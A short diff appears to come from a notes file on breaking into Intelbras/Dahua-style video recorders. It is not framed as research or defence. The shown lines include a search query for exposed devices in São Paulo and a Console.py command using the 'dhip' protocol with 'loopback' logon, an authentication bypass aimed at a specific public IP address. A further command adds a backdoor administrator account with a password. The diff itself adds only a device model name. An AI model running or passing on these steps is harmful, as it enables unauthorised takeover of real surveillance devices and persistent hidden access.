@@ -14,6 +14,8 @@ mhdx country:"BR" product:"Intelbras MHDX 1116" city:"São Paulo"
 
 MHDX 1016
 
+VIP-5450-Z
+
 python3 Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204
 
 usermgr add pdr Senha@2026 admin
